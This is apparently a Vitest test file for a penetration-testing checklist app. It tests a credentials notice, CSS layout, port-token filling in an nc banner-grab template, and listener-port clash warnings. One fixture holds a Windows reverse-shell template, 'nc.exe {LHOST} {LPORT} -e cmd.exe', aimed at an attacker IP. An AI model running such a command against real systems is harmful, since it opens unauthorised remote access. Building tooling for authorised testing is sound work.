import { readFileSync } from "node:fs";
import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { describe, expect, it, vi } from "vitest";
import { CommandList } from "../features/checklist/CommandList/CommandList";
import { GoalRow } from "../features/checklist/GoalRow/GoalRow";
import { goalCommands } from "../features/checklist/goalCommands";
import { PortChip } from "../features/checklist/PortChip/PortChip";
import { usePortPickStore } from "../features/checklist/portPick";
import type { LibraryCommand } from "../engines/library/types";
import type { FillInput } from "../engines/checklist";
import type { Engagement } from "../types/engagement";

/** The declarations of one rule in a feature sheet (jsdom loads no CSS, so layout rules are read from the source). */
const rule = (file: string, selector: string) => {
  const scss = readFileSync(file, "utf8");
  const start = scss.indexOf(`${selector} {`);
  return scss.slice(start, scss.indexOf("}", start));
};

const labels = Array.from({ length: 7 }, (_, i) => `CORP\\svc_${i}`);
const row = (cmds = []) => (
  <ul>
    <GoalRow goal={{ id: "g", title: "Scan all 65,535 TCP ports", why: "" }} state={{ status: "done" }} commands={cmds} evidence={[]} newCredLabels={labels} onStatus={vi.fn()} onNotes={vi.fn()} />
  </ul>
);

describe("new credential notice", () => {
  it("is a disclosure with a count; opening lists labels one per line, each truncating with its full value in a title", async () => {
    render(row());
    const btn = screen.getByRole("button", { name: "New credentials since done (7)" });
    expect(btn).toHaveAttribute("aria-expanded", "false");
    expect(screen.queryByText("CORP\\svc_3")).toBeNull();
    await userEvent.click(btn);
    const items = screen.getAllByRole("listitem").filter((li) => li.textContent?.startsWith("CORP"));
    expect(items).toHaveLength(7);
    for (const li of items) {
      expect(li).toHaveClass("goal-row__cred");
      expect(li).toHaveAttribute("title", li.textContent);
    }
  });
  it("title column is min-w-0 and wraps; the status control sits in its own column", () => {
    render(row());
    const col = screen.getByTestId("goal-title-col");
    expect(col).toHaveClass("goal-row__title-col");
    expect(rule("src/features/checklist/GoalRow/GoalRow.scss", ".goal-row__title-col")).toMatch(/min-width: 0;/);
    expect(rule("src/features/checklist/GoalRow/GoalRow.scss", ".goal-row__title-col")).not.toMatch(/white-space/);
    expect(screen.getByTestId("goal-status")).toContainElement(screen.getByRole("radiogroup", { name: /Status/ }));
    expect(rule("src/features/checklist/GoalRow/GoalRow.scss", ".goal-row__title")).not.toMatch(/white-space/);
  });
  it("goal status stays on the title line when new credentials open", async () => {
    render(row());
    const li = document.querySelector("li[data-goal-id]") as HTMLElement;
    // jsdom has no layout: the row is a start-aligned grid and nothing offsets the status or the title.
    expect(li).toHaveClass("goal-row");
    expect(rule("src/features/checklist/GoalRow/GoalRow.scss", ".goal-row")).toMatch(/display: grid;[^]*align-items: flex-start;/);
    const status = screen.getByTestId("goal-status");
    const title = screen.getByTestId("goal-title-col");
    expect(status.parentElement).toBe(li);
    expect(title.parentElement).toBe(li);
    expect(status.className).toBe("");
    expect(rule("src/features/checklist/GoalRow/GoalRow.scss", ".goal-row__title-col")).not.toMatch(/margin|align-self|align-items/);
    await userEvent.click(screen.getByRole("button", { name: /New credentials since done/ }));
    expect(status.parentElement).toBe(li);
    expect(li).toHaveClass("goal-row");
  });
  it("the new-credentials line is a disclosure with a count", () => {
    render(row());
    expect(screen.getByRole("button", { name: /^New credentials since done \(7\)$/ })).toHaveAttribute("aria-expanded", "false");
  });
});

describe("CommandList spacing", () => {
  it("separates commands with gap-4 and mutes the description", () => {
    render(<CommandList commands={[{ id: "a", title: "Desc A", text: "id", unresolved: [], msfMarker: false }, { id: "b", title: "Desc B", text: "ls", unresolved: [], msfMarker: false }]} />);
    const ul = screen.getAllByRole("list")[0];
    expect(ul).toHaveClass("command-list");
    expect(rule("src/features/checklist/CommandList/CommandList.scss", ".command-list")).toMatch(/gap: var\(--space-lg\);/);
    expect(ul.firstElementChild).toHaveClass("command-list__item");
    expect(rule("src/features/checklist/CommandList/CommandList.scss", ".command-list__item")).toMatch(/gap: var\(--space-xs\);/);
    const d = screen.getAllByTestId("command-desc")[0];
    expect(d).toHaveClass("command-list__desc");
    expect(d).not.toHaveClass("command-list__desc--strong");
    expect(rule("src/features/checklist/CommandList/CommandList.scss", ".command-list__desc")).toMatch(/type\(meta\);\s*color: var\(--muted-2\);/);
  });
});

describe("{PORT} on checklist steps", () => {
  const host = { id: "h1", engagementId: "e1", name: "t", ip: "10.0.0.5", os: "linux" } as never;
  const svc = (port: number) => ({ id: `s${port}`, hostId: "h1", port, protocol: "tcp", state: "open", name: "x" }) as never;
  const input = (): FillInput => ({
    host, engagement: { id: "e1", kind: "pentest", scopeCidrs: [], excludedCidrs: [] } as never, hosts: [host],
    servicesByHost: new Map([["h1", [svc(8080), svc(22), svc(80)]]]), tunnels: [], attackerIp: "10.10.14.1", listenerPort: "4444",
  });
  it("fills the lowest port, offers all, and a pick refills", () => {
    const library: LibraryCommand[] = [{ id: "nc", title: "Banner", template: "nc -nv {TARGET_IP} {PORT}", goals: ["h-enum-identified"], os: "any", runFrom: "attacker" } as never];
    usePortPickStore.setState({ picks: {} });
    const eng = { id: "e1", kind: "pentest" } as unknown as Engagement;
    let c = goalCommands("h-enum-identified", input(), eng, library).commands.find((x) => x.id === "nc")!;
    expect(c.text).toContain("10.0.0.5 22");
    expect(c.portToken?.choices).toEqual([22, 80, 8080]);
    render(<PortChip commands={[c]} />);
    expect(screen.getByRole("combobox", { name: "Port" })).toHaveTextContent("22");
    usePortPickStore.getState().set(c.portToken!.key, 8080);
    c = goalCommands("h-enum-identified", input(), eng, library).commands.find((x) => x.id === "nc")!;
    expect(c.text).toContain("10.0.0.5 8080");
    void within;
  });
  it("offers no fake port: a UDP open|filtered port makes no chip and leaves {PORT} unresolved", () => {
    const library: LibraryCommand[] = [{ id: "nc", title: "Banner", template: "nc -nv {TARGET_IP} {PORT}", goals: ["h-enum-identified"], os: "any", runFrom: "attacker" } as never];
    usePortPickStore.setState({ picks: {} });
    const eng = { id: "e1", kind: "pentest" } as unknown as Engagement;
    const base = input();
    const udp = { id: "s7", hostId: "h1", port: 7, protocol: "udp", state: "open|filtered", name: "echo" } as never;
    const inp = { ...base, servicesByHost: new Map([["h1", [udp, svc(80), svc(22)]], ["h2", [svc(9)]]]) } as FillInput;
    const c = goalCommands("h-enum-identified", inp, eng, library).commands.find((x) => x.id === "nc")!;
    expect(c.portToken?.choices).toEqual([22, 80]);
    const none = { ...base, servicesByHost: new Map([["h1", [udp]]]) } as FillInput;
    const n = goalCommands("h-enum-identified", none, eng, library).commands.find((x) => x.id === "nc")!;
    expect(n.portToken).toBeUndefined();
    expect(n.text).toContain("{PORT}");
    expect(n.unresolved).toContain("PORT");
    const { container } = render(<PortChip commands={[n]} />);
    expect(container).toBeEmptyDOMElement();
  });
  it("shows no chip when no displayed command uses {PORT}", () => {
    const library: LibraryCommand[] = [{ id: "snmp", title: "SNMP", template: "snmpwalk -v2c -c public {TARGET_IP}", goals: ["h-enum-identified"], os: "any", runFrom: "attacker" } as never];
    const eng = { id: "e1", kind: "pentest" } as unknown as Engagement;
    const cmds = goalCommands("h-enum-identified", input(), eng, library).commands.filter((x) => x.id === "snmp");
    expect(cmds).toHaveLength(1);
    expect(cmds[0].portToken).toBeUndefined();
    const { container } = render(<PortChip commands={cmds} />);
    expect(container).toBeEmptyDOMElement();
  });
});

describe("{LPORT} clash with a logged listener", () => {
  const host = { id: "h1", engagementId: "e1", name: "t", ip: "10.0.0.5", os: "windows" } as never;
  const eng = { id: "e1", kind: "pentest" } as unknown as Engagement;
  const base = (): FillInput => ({
    host, engagement: { id: "e1", kind: "pentest", scopeCidrs: [] } as never, hosts: [host],
    servicesByHost: new Map(), tunnels: [], attackerIp: "10.10.14.1", listenerPort: "4444",
  });
  const rev = { id: "rev", title: "Reverse shell", template: 'nc.exe {LHOST} {LPORT} -e cmd.exe', goals: ["h-enum-identified"], os: "any", runFrom: "target" } as never;

  it("warns and names the next free port when {LPORT} is already a logged listener", () => {
    const library: LibraryCommand[] = [rev];
    const input = { ...base(), listenerPorts: new Set([4444, 4445]) };
    const c = goalCommands("h-enum-identified", input, eng, library).commands.find((x) => x.id === "rev")!;
    expect(c.portClash).toEqual({ port: 4444, suggested: 4446 });
    render(<CommandList commands={[c]} />);
    expect(screen.getByText(/port 4444 already has a listener; try 4446/)).toBeInTheDocument();
  });

  it("stays quiet when the port is free or the command has no {LPORT}", () => {
    const library: LibraryCommand[] = [rev, { id: "noport", title: "x", template: "whoami", goals: ["h-enum-identified"], os: "any", runFrom: "target" } as never];
    const free = goalCommands("h-enum-identified", { ...base(), listenerPorts: new Set([9001]) }, eng, library).commands.find((x) => x.id === "rev")!;
    expect(free.portClash).toBeUndefined();
    const noLport = goalCommands("h-enum-identified", { ...base(), listenerPorts: new Set([4444]) }, eng, library).commands.find((x) => x.id === "noport")!;
    expect(noLport.portClash).toBeUndefined();
  });
});
